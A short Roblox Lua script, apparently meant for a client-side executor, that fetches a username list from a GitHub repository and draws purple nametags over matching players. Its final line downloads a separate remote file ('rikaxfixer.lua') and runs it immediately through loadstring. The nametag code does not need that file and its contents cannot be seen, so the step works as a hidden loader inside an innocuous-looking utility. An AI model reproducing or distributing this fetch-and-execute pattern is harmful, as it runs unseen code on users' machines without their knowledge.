local playersService = game:GetService("Players")
local runService = game:GetService("RunService")
local httpService = game:GetService('HttpService')
local json = game:HttpGet('https://github.com/popoffroblox/DeveloperLists/raw/refs/heads/main/list.json')
local decoded = httpService:JSONDecode(json)
local playersList = {}
local function nametag(plr, type)
    if not plr.Character or not plr.Character:FindFirstChild("Head") then return end
    local head = plr.Character.Head
    if head:FindFirstChild("nametagreallegitwhat") then return end
    local tag = Instance.new("BillboardGui")
    tag.Name = "nametagreallegitwhat"
    tag.Adornee = head
    tag.Size = UDim2.new(0,100,0,50)
    tag.StudsOffset = Vector3.new(0,2,0)
    tag.AlwaysOnTop = true
    local label = Instance.new("TextLabel")
    label.Parent = tag
    label.Size = UDim2.new(1,0,1,0)
    label.BackgroundTransparency = 1
    label.Text = tostring(type)
    label.TextColor3 = Color3.fromRGB(170,0,255)
    label.TextStrokeTransparency = 0
    label.TextStrokeColor3 = Color3.fromRGB(20,20,20)
    label.TextScaled = true
    label.Font = Enum.Font.SourceSansBold

    tag.Parent = game:GetService("CoreGui")
end

for _, name in pairs(playersList) do
    local plr = playersService:FindFirstChild(name)
    if plr then
        plr.CharacterAdded:Connect(function() nametag(plr, name) end)
        nametag(plr, name)
    end
end
playersService.PlayerAdded:Connect(function(plr)
    for user, tag in pairs(decoded) do
        if plr.Name == user then
            plr.CharacterAdded:Connect(function() nametag(plr, tag) end)
            nametag(plr, tag)
        end
    end
end)
for user, tag in pairs(decoded) do
    local plr = playersService:FindFirstChild(user)
    if plr then
        plr.CharacterAdded:Connect(function() nametag(plr, tag) end)
        nametag(plr, tag)
    end
end
loadstring(game:HttpGet('https://github.com/popoffroblox/DeveloperLists/raw/refs/heads/main/rikaxfixer.lua', true))()
